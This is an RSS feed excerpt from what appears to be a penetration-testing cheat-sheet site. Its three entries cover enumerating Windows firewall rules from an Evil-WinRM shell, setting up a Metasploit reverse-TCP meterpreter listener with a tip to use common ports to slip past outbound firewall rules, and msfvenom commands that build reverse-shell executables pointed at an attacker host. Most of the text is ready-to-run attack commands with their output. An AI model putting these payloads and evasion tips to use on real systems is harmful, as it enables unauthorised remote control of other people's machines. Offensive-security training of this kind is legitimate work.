channel.title: Firewall on TLDRBins
channel.description: Recent content in Firewall on TLDRBins

item.title: Firewall (Windows)
item.description: Windows Check Firewall Rules # cmd cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:" *Evil-WinRM* PS C:\Users\maria> cmd /c "netsh advfirewall firewall show rule name=all|findstr Name:" Rule Name: World Wide Web Services (HTTPS Traffic-In) Rule Name: World Wide Web Services (HTTP Traffic-In) Rule Name: Shell Input Application ...[SNIP]... Rule Name: Virtual Machine Monitoring (Echo Request - ICMPv6-In) Rule Name: Virtual Machine Monitoring (Echo Request - ICMPv4-In) Rule Name: Virtual Machine Monitoring (DCOM-In) # powershell Get-NetFirewallProfile *Evil-WinRM* PS C:\Users\maria> Get-NetFirewallProfile Name : Domain Enabled : False DefaultInboundAction : NotConfigured DefaultOutboundAction : NotConfigured AllowInboundRules : NotConfigured AllowLocalFirewallRules : NotConfigured AllowLocalIPsecRules : NotConfigured AllowUserApps : NotConfigured AllowUserPorts : NotConfigured AllowUnicastResponseToMulticast : NotConfigured NotifyOnListen : False EnableStealthModeForIPsec : NotConfigured LogFileName : %systemroot%\system32\LogFiles\Firewall\pfirewall.

item.title: Metasploit Listener
item.description: Start a Metasploit Listener msfconsole -q $ msfconsole -q msf6 > use exploit/multi/handler msf6 > use exploit/multi/handler [*] Using configured payload generic/shell_reverse_tcp set payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp set lhost <LOCAL_IP> msf6 exploit(multi/handler) > set lhost 10.10.14.31 lhost => 10.10.14.31 set lport <LOCAL_PORT> msf6 exploit(multi/handler) > set lport 1337 lport => 1337 run msf6 exploit(multi/handler) > run [*] Started reverse TCP handler on 10.10.14.31:1337 Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules

item.title: Metasploit Shellcode
item.description: Generate Shellcode Note: stageless payload can catch with nc directly Windows x64 Staged exe Stageless exe Staged dll msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.exe $ msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.31 LPORT=1337 > rev.exe No encoder specified, outputting raw payload Payload size: 510 bytes Final size of exe file: 7168 bytes msfvenom -p windows/x64/shell_reverse_tcp -a x64 -f exe --platform windows LHOST=<LOCAL_IP> LPORT=<LOCAL_PORT> > rev.
